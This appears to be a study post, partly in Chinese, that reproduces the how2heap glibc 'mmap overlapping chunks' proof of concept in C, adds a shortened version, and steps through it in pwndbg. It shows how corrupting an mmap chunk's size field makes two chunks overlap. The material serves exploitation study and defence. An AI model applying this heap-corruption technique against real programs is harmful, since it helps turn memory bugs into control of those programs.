
```C
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
/*
Technique should work on all versions of GLibC
Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`
POC written by POC written by Maxwell Dulin (Strikeout)
*/
int main(){
/*
A primer on Mmap chunks in GLibC
==================================
In GLibC, there is a point where an allocation is so large that malloc
decides that we need a seperate section of memory for it, instead
of allocating it on the normal heap. This is determined by the mmap_threshold var.
Instead of the normal logic for getting a chunk, the system call *Mmap* is
used. This allocates a section of virtual memory and gives it back to the user.
Similarly, the freeing process is going to be different. Instead
of a free chunk being given back to a bin or to the rest of the heap,
another syscall is used: *Munmap*. This takes in a pointer of a previously
allocated Mmap chunk and releases it back to the kernel.
Mmap chunks have special bit set on the size metadata: the second bit. If this
bit is set, then the chunk was allocated as an Mmap chunk.
Mmap chunks have a prev_size and a size. The *size* represents the current
size of the chunk. The *prev_size* of a chunk represents the left over space
from the size of the Mmap chunk (not the chunks directly belows size).
However, the fd and bk pointers are not used, as Mmap chunks do not go back
into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of
the chunk must be page-aligned.
The POC below is essentially an overlapping chunk attack but on mmap chunks.
This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c.
The main difference is that mmapped chunks have special properties and are
handled in different ways, creating different attack scenarios than normal
overlapping chunk attacks. There are other things that can be done,
such as munmapping system libraries, the heap itself and other things.
This is meant to be a simple proof of concept to demonstrate the general
way to perform an attack on an mmap chunk.
For more information on mmap chunks in GLibC, read this post:
http://tukan.farm/2016/07/27/munmap-madness/
*/
int* ptr1 = malloc(0x10);
printf("This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n");
printf("Extremely large chunks are special because they are allocated in their own mmaped section\n");
printf("of memory, instead of being put onto the normal heap.\n");
puts("=======================================================\n");
printf("Allocating three extremely large heap chunks of size 0x100000 \n\n");
long long* top_ptr = malloc(0x100000);
printf("The first mmap chunk goes directly above LibC: %p\n",top_ptr);
// After this, all chunks are allocated downwards in memory towards the heap.
long long* mmap_chunk_2 = malloc(0x100000);
printf("The second mmap chunk goes below LibC: %p\n", mmap_chunk_2);
long long* mmap_chunk_3 = malloc(0x100000);
printf("The third mmap chunk goes below the second mmap chunk: %p\n", mmap_chunk_3);
printf("\nCurrent System Memory Layout \n" \
"================================================\n" \
"running program\n" \
"heap\n" \
"....\n" \
"third mmap chunk\n" \
"second mmap chunk\n" \
"LibC\n" \
"....\n" \
"ld\n" \
"first mmap chunk\n"
"===============================================\n\n" \
);
printf("Prev Size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-2]);
printf("Size of third mmap chunk: 0x%llx\n\n", mmap_chunk_3[-1]);
printf("Change the size of the third mmap chunk to overlap with the second mmap chunk\n");
printf("This will cause both chunks to be Munmapped and given back to the system\n");
printf("This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n");
// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.
// Additionally, this same attack can be used with the prev_size instead of the size.
mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;
printf("New size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-1]);
printf("Free the third mmap chunk, which munmaps the second and third chunks\n\n");
/*
This next call to free is actually just going to call munmap on the pointer we are passing it.
The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845
With normal frees the data is still writable and readable (which creates a use after free on
the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this
data is read or written to, the program crashes.
Because of this added restriction, the main goal is to get the memory back from the system
to have two pointers assigned to the same location.
*/
// Munmaps both the second and third pointers
free(mmap_chunk_3);
/*
Would crash, if on the following:
mmap_chunk_2[0] = 0xdeadbeef;
This is because the memory would not be allocated to the current program.
*/
/*
Allocate a very large chunk with malloc. This needs to be larger than
the previously freed chunk because the mmapthreshold has increased to 0x202000.
If the allocation is not larger than the size of the largest freed mmap
chunk then the allocation will happen in the normal section of heap memory.
*/
printf("Get a very large chunk from malloc to get mmapped chunk\n");
printf("This should overlap over the previously munmapped/freed chunks\n");
long long* overlapping_chunk = malloc(0x300000);
printf("Overlapped chunk Ptr: %p\n", overlapping_chunk);
printf("Overlapped chunk Ptr Size: 0x%llx\n", overlapping_chunk[-1]);
// Gets the distance between the two pointers.
int distance = mmap_chunk_2 - overlapping_chunk;
printf("Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n", distance);
printf("Value of index 0 of mmap chunk 2 prior to write: %llx\n", mmap_chunk_2[0]);
// Set the value of the overlapped chunk.
printf("Setting the value of the overlapped chunk\n");
overlapping_chunk[distance] = 0x1122334455667788;
// Show that the pointer has been written to.
printf("Second chunk value (after write): 0x%llx\n", mmap_chunk_2[0]);
printf("Overlapped chunk value: 0x%llx\n\n", overlapping_chunk[distance]);
printf("Boom! The new chunk has been overlapped with a previous mmaped chunk\n");
assert(mmap_chunk_2[0] == overlapping_chunk[distance]);
}
```

简化版本：

```C
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
int main(){
long *m1 = malloc(0x100000);
long *m2 = malloc(0x100000);
long *m3 = malloc(0x100000);
long size = m3[-1]-2 + m2[-1]-2 + 2;
m3[-1] = size;
free(m3);
long *m4 = malloc(0x300000);
m4[m2-m4] = 0x1122334455667788;
assert(m2[0] == 0x1122334455667788);
}
```

### pwndbg调试

先调用申请了三个大的内存块（`0x100000`可以整除4096，是按页对齐的），观察下执行前后的内存布局：

在`malloc`之前，并没有创建线程的`heap`段。

![](upload/attach/202204/882497_SQYE5DV975GR7PY.png)

在`malloc`之后，`heap`段创建完成。但是由于`0x100000` 甚至无法从`top chunk`中分配，于是调用`sysmalloc`从系统中直接申请内存。申请的内存位于`mmap`映射段。

![](upload/attach/202204/882497_YDU7GQ9BS4ZW627.png)

`chunk_m1`的位置在`ld`之上，也就是`chunk_m1`地址比`ld`的地址高。

继续申请一个`0x100000`大小的内存，也是调用`sysmalloc`从系统直接申请。但是申请到的位置有了变化。

![](upload/attach/202204/882497_7WXEYK46M7YB3UT.png)

`chunk_m2`的位置在`libc`之下，也就是`chunk_m2`地址比`libc`的地址低。

继续申请`0x100000`大小的`chunk_m3`。

![](upload/attach/202204/882497_8QFBPNZ4ENDKNZW.png)

接下来的操作和普通`chunk`的`overlapping`很像，修改`chunk_m3`的`size`位，覆盖到`chunk_m2`，`free(chunk_m3)`的时候就是。

由于是`mmap chunk`，`chunk`的`size`位后三位起到了作用。后三位分别用来标记：

- `A` = Allocated Arena
- `M` = Mmap'd
- `P` = prev in use

这里由于`chunk`是在`mmap`映射段，所以`M`位是1，`2^1=2`，比真实大小要多2。修改`chunk_m3`的时候也要注意修改到`M`位。

```text
pwndbg> p m3
$3 = (long *) 0x7ffff77df010
pwndbg> x/4gx 0x7ffff77df000
0x7ffff77df000: 0x0000000000000000 0x0000000000101002
0x7ffff77df010: 0x0000000000000000 0x0000000000000000
pwndbg> p/x mp_.mmap_threshold
```

`free(chunk_m3)`之后，`libc`下面那块内存归还给系统了。
